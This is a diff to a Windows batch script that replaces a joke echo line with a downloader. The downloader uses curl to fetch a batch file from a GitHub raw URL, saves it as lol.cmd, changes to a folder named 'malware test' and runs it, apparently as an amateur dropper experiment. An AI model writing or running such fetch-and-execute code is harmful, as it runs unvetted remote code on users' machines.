@@ -1,9 +1,23 @@
-@echo off 
+@echo off
+setlocal
 
+:: Set the URL of the raw file from GitHub
+set GITHUB_URL=https://raw.githubusercontent.com/ninjaman92/batch-tests/refs/heads/master/Message_Displayer.bat
+:: Set the destination folder and file name
+set DESTINATION=%CD%\lol.cmd
 
+:: Download the file using curl
+echo Downloading file from GitHub...
+curl -L -o "%DESTINATION%" "%GITHUB_URL%"
 
+:: Check if the download was successful
+if %ERRORLEVEL% neq 0 (
+    echo Failed to download the file.
+    exit /b 1
+)
 
-
-
-
-echo helooooo world, if you are reading this i have shidded
+echo Download complete: %DESTINATION%
+cd F:\vrc projects\malware test
+start lol.cmd
+pause 
+exit /b 0
